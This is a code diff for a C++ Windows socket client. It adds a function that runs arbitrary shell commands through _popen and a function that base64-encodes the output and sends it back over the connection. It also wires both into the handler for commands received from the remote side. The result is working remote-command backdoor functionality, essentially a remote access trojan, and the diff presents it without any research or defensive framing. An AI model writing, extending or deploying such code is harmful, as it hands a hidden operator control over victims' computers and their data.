@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include <stdexcept>
 #include <vector>
 #include <sstream>
 #include <algorithm>
@@ -36,6 +37,23 @@ public:
 		while (std::getline(ss, token, delim)) {
 			cont.push_back(token);
 		}
+	}
+	string exec(const char* cmd) {
+		char buffer[128];
+		std::string result = "";
+		FILE* pipe = _popen(cmd, "r");
+		if (!pipe) throw std::runtime_error("popen() failed!");
+		try {
+			while (fgets(buffer, sizeof buffer, pipe) != NULL) {
+				result += buffer;
+			}
+		}
+		catch (...) {
+			_pclose(pipe);
+			throw;
+		}
+		_pclose(pipe);
+		return result;
 	}
 	string base64_encode(const std::string &in){
 		std::string out;
@@ -123,6 +141,14 @@ public:
 		}
 		return rtval;
 	}
+	bool checkSError(const int val){
+		bool rtval = false;
+		if (val == SOCKET_ERROR){
+			setError("Error While Sending Data!");
+			rtval = true;
+		}
+		return rtval;
+	}
 	SOCKET init(){
 		SOCKET rtval = socket(AF_INET, SOCK_STREAM, 0);
 		return rtval;
@@ -180,14 +206,26 @@ public:
 
 		return converter;
 	}
+	bool senddata(string tosend){
+		bool rtval = true;
+		tosend = stringer.base64_encode(tosend) + "abigbreakhere";
+		int send_conn = send(connection_sock, tosend.c_str(), tosend.size() + 1, 0);
+		if (!(this->checkSError(send_conn))){
+			rtval = false;
+		}
+		return rtval;
+	}
 	void execute(string command){
 		string toexecute;
+		string output;
 		if (command.find(":") != string::npos){  // Command Prompt
 			vector<string> values;
 			stringer.split(command, values, ':');
 			if (values.size() >= 2){
 				if (stringer.base64_decode(values[0]) == "true"){
 					toexecute = stringer.base64_decode(values[1]);
+					output    = stringer.exec(toexecute.c_str());
+					senddata(output);
 				}else{
 					cout << "Received False in Command Prompt" << endl;
 				}
@@ -206,12 +244,10 @@ public:
 			if (data == "closed"){
 				rtval = false;
 				break;
-			}
-			else if (data == "shutdown"){
+			}else if (data == "shutdown"){
 				rtval = true;
 				break;
-			}
-			else{
+			}else{
 				clean(data);
 				execute(data);
 			}
